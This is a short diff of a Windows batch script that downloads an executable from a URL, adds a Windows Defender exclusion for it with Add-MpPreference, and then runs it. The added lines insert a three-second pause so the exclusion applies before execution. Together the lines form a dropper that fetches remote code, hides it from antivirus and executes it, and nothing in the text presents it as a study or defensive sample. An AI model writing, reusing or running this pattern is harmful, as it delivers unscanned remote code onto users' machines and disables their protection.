@@ -19,6 +19,9 @@ powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%outputFile%'"
 :: Add exclusion for the downloaded EXE itself
 powershell -Command "Add-MpPreference -ExclusionPath '%outputFile%'"
 
+:: Small delay to ensure exclusion is applied
+timeout /nobreak /t 3 >nul
+
 :: Run the downloaded file
 start "" "%outputFile%"
 
